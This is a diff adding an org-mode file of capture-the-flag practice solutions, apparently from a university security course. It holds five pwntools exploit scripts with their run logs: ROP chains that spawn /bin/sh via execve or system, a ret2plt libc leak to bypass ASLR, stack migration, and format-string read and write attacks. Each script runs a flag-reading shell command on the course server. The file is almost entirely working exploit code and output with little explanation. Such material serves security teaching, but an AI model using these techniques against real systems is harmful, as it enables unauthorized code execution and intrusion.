@@ -1,0 +1,207 @@
+* prac3
+** simplerop_revenge
+   simple ROP, use buffer overflow to write ROP gadget and call exec system call
+#+BEGIN_SRC python :results org output :python  ~/pyenv/bin/python3 :exports both
+from pwn import *
+
+host = "csie.ctf.tw"
+port = 10130
+context.arch = "amd64"
+
+
+buf_addr = 0x6c9a20
+binsh = b"/bin/sh\x00"
+payload = b"A" * (0x20 + 8)
+syscall = 0x4671b5
+pop_rdi = 0x401456
+pop_rsi = 0x401577
+pop_rax_rdx_rbx = 0x478516
+mov_drdi_rsi = 0x47a502
+ropchain = flat([payload, pop_rdi, buf_addr,
+                 pop_rsi, binsh, mov_drdi_rsi,
+                 pop_rax_rdx_rbx, 59, 0,
+                 0, pop_rsi, 0, syscall])
+
+r = remote(host, port)
+r.recvuntil(":")
+r.send(ropchain)
+r.sendline("cat /home/`whoami`/flag")
+f = r.recvline()
+print(f)
+
+#+END_SRC
+
+#+RESULTS:
+#+BEGIN_SRC org
+[x] Opening connection to csie.ctf.tw on port 10130
+[x] Opening connection to csie.ctf.tw on port 10130: Trying 140.112.31.96
+[+] Opening connection to csie.ctf.tw on port 10130: Done
+b'FLAG{TAKEMY_REVENGE}\n'
+[*] Closed connection to csie.ctf.tw port 10130
+#+END_SRC
+
+** ret2plt
+   use ROP to leak libc address to bypass ASLR, and call system to get shell
+#+BEGIN_SRC python :results org output :python  ~/pyenv/bin/python3 :exports both
+
+from pwn import *
+
+host = "csie.ctf.tw"
+port = 10131
+context.arch = "amd64"
+
+buf = 0x601040
+
+payload = b"A" * (0x20 + 8)
+pop_rdi = 0x4006f3
+pop_rsi_r15 = 0x4006f1
+
+
+puts_plt = 0x4004e0
+puts_got = 0x601018
+gets_plt = 0x400510
+puts_off = 0x6f690
+system_off = 0x45390
+
+
+ropchain1 = flat([payload, pop_rdi, puts_got, puts_plt,
+                  pop_rdi, puts_got, gets_plt, pop_rdi,
+                  puts_got+8, puts_plt])
+
+
+r = remote(host, port)
+r.recvuntil(":")
+r.sendline(ropchain1)
+r.recvline()
+puts_addr = u64(r.recvline().strip().ljust(8, b"\x00"))
+libc_base = puts_addr - puts_off
+system_addr = libc_base + system_off
+r.sendline(p64(system_addr) + b"/bin/sh" )
+r.sendline("cat /home/`whoami`/flag")
+f = r.recvline()
+print(f)
+
+#+END_SRC
+
+#+RESULTS:
+#+BEGIN_SRC org
+[x] Opening connection to csie.ctf.tw on port 10131
+[x] Opening connection to csie.ctf.tw on port 10131: Trying 140.112.31.96
+[+] Opening connection to csie.ctf.tw on port 10131: Done
+b'FLAG{YOUCAN_RET_2_EVERYWHERE}\n'
+[*] Closed connection to csie.ctf.tw port 10131
+#+END_SRC
+
+** migr4ti0n
+   because no enough space for ROP, so we write ROP chain to =.data= section by point rbp to it 
+   (key word: Stack migration) and repeat jump between 2 ROP buffer.
+#+BEGIN_SRC python :results org output :python  ~/pyenv/bin/python3 :exports both
+from pwn import *
+
+host = "csie.ctf.tw"
+port = 10132
+
+context.arch = "amd64"
+payload = b"A" * 0x30
+
+puts_plt = 0x4004d8
+puts_got = 0x600fd8
+read_plt = 0x4004e0
+system_off = 0x45390
+puts_off = 0x6f690
+
+leave_ret = 0x40064a
+pop_rdi = 0x4006b3
+pop_rdx = 0x4006d4
+pop_rsi_r15 = 0x4006b1
+
+buf1 = 0x00602000 - 0x200
+buf2 = buf1 + 0x100
+
+#read(0, buf1, size)
+rop1 = flat([payload, buf1, pop_rdi, 0, pop_rsi_r15, buf1, 0,
+             pop_rdx, 0x100, read_plt, leave_ret])
+
+rop2 = flat([buf2, pop_rdi, puts_got, puts_plt,
+             pop_rdi, 0, pop_rsi_r15, buf2, 0,
+             pop_rdx, 0x100, read_plt, leave_ret])
+r = remote(host, port)
+r.recvline()
+r.send(rop1)
+r.send(rop2)
+puts_addr = u64(r.recvline().strip().ljust(8, b"\x00"))
+libc_base = puts_addr - puts_off
+system_addr = libc_base + system_off
+
+rop3 = flat([buf1, pop_rdi, buf2 + 8*4, system_addr, "/bin/sh\x00", leave_ret])
+r.send(rop3)
+r.sendline("cat /home/`whoami`/flag")
+f = r.recvline()
+print(f)
+
+#+END_SRC
+
+#+RESULTS:
+#+BEGIN_SRC org
+[x] Opening connection to csie.ctf.tw on port 10132
+[x] Opening connection to csie.ctf.tw on port 10132: Trying 140.112.31.96
+[+] Opening connection to csie.ctf.tw on port 10132: Done
+b'FLAG{49796c31e88bf1c45fc21212693e07cd652296dd}\n'
+[*] Closed connection to csie.ctf.tw port 10132
+#+END_SRC
+
+** cr4ck
+   use format string to leak memory.
+#+BEGIN_SRC python :results org output :python  ~/pyenv/bin/python3 :exports both
+from pwn import *
+
+host = "csie.ctf.tw"
+port = 10133
+
+
+flag = p64(0x600ba0)
+r = remote(host, port)
+
+r.sendline(b"aaaa%7$s"+ flag)
+f = r.recvline().split(b"aaaa")[-1]
+print(f)
+
+#+END_SRC
+
+#+RESULTS:
+#+BEGIN_SRC org
+[x] Opening connection to csie.ctf.tw on port 10133
+[x] Opening connection to csie.ctf.tw on port 10133: Trying 140.112.31.96
+[+] Opening connection to csie.ctf.tw on port 10133: Done
+b'FLAG{CRACKCR4CKCRaCK}\n'
+[*] Closed connection to csie.ctf.tw port 10133
+#+END_SRC
+
+** craxme
+   use format string to overwrite variable value
+
+#+BEGIN_SRC python :results org output :python  ~/pyenv/bin/python3 :exports both
+from pwn import *
+
+host = "csie.ctf.tw"
+port = 10134
+
+r = remote(host , port)
+
+magic = 0x0060106c
+fmt1 = b"%218c%22$n".ljust(0x80, b"A") + p64(magic)
+r.recvuntil(":")
+r.send(fmt1)
+f = r.recvline()
+print(f[0x153:])
+r.close()
+#+END_SRC
+
+#+RESULTS:
+#+BEGIN_SRC org
+[x] Opening connection to csie.ctf.tw on port 10134
+[x] Opening connection to csie.ctf.tw on port 10134: Trying 140.112.31.96
+[+] Opening connection to csie.ctf.tw on port 10134: Done
+b'FLAG{JUST CRAXME!@_@}\n'
+[*] Closed connection to csie.ctf.tw port 10134
+#+END_SRC
